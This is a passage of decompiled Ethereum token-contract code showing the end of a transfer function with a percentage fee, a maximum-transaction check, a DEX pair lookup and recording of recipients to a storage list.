                                                            staticcall address(stor20.field_8).WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor19[stor19.length].field_256 = arg2
                                                            if arg2 < 0:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -1:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 'NH{q', 17
                                                            if not arg2:
                                                                revert with 'NH{q', 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor19[stor19.length].field_256 = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100 > 0:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
    return 1
}



}
